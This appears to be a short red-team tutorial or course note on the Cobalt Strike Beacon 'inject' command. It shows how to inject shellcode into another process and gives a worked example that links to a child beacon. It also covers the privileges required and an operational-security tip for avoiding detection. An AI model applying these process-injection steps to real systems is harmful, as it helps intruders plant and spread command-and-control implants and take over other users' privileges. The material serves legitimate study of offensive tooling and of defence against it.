The `inject` command will inject a Beacon payload in the form of shellcode into a target process. You can inject into processes owned by the current user without needing elevation, but local admin privileges are required to inject into processes owned by other users. If you inject into a process owned by a different user, your Beacon will run with all the local and domain privileges of that user.
```shell
beacon> ps

beacon> inject 3320 x64 tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

Where:
-   `3320` is the PID of the target process.
-   `x64` is the architecture of that process.
-   `tcp-4444-local` is the name of the listener.

**OPSEC Alert**
>Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).
